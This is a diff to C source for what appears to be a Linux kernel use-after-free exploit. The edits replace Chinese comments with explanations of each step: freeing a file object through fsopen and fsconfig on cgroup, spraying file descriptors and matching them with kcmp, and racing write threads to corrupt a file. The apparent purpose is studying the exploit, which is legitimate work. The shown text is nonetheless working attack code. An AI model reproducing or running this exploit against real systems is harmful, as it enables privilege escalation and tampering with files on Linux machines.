@@ -291,12 +291,11 @@ int spray_files() {
       perror("open file");
       printf("%d\n", i);
     }
-    // 检查uaf_fd和fds[i]是否是用一个打开的文件描述符
-    // 如果相等则说明新打开的文件描述符在原来uaf文件位置处
+    // 检查uaf_fd和fds[i]是否是指向的同一个文件对象
     if (syscall(__NR_kcmp, getpid(), getpid(), KCMP_FILE, uaf_fd, fds[i]) ==
         0) {
       found = 1;
-      printf("[!] found, file id %d\n", i);
+      printf("[!] found {uaf_fd: %d, fds[%d]: %d}\n", uaf_fd, i, fds[i]);
       // 清理打开的文件描述符
       for (int j = 0; j < i; j++)
         close(fds[j]);
@@ -312,7 +311,7 @@ int spray_files() {
 }
 
 void trigger() {
-  // 以流的形式打开cgroup
+  // 打开cgroup虚拟文件系统
   int fs_fd = syscall(__NR_fsopen, "cgroup", 0);
   if (fs_fd < 0) {
     perror("fsopen");
@@ -328,24 +327,27 @@ void trigger() {
     die("failed to open symbolic file\n");
   }
 
-  // TODO:fsconfig是做什么的？
+  // 对cgroup虚拟文件系统进行配置
+  // 第三个参数对应的宏是FSCONFIG_SET_FD，表示设置文件描述符
+  // 该调用设置source为uaf_fd，本身就是不合法的
   if (syscall(__NR_fsconfig, fs_fd, 5, "source", 0, uaf_fd)) {
     perror("fsconfig");
     exit(-1);
   }
-  // free the uaf fd
+  // 关闭fs_fd后，低层会调用put_fs_context()清理
+  // 导致uaf_fd指向的file对象被释放
   close(fs_fd);
 }
 
 void loop() {
-  // 触发非法解分配文件对象
+  // 触发非法释放文件对象
   trigger();
 
-  // 延长时间窗口
+  // 延长时间窗口：打开uaf文件，写入大量数据
   pthread_t p_id;
   pthread_create(&p_id, NULL, slow_write, NULL);
 
-  // 正常写入文件
+  // 正常写入文件：直接写入uaf_fd
   pthread_t p_id_cmd;
   pthread_create(&p_id_cmd, NULL, write_cmd, NULL);
   // 文件污染
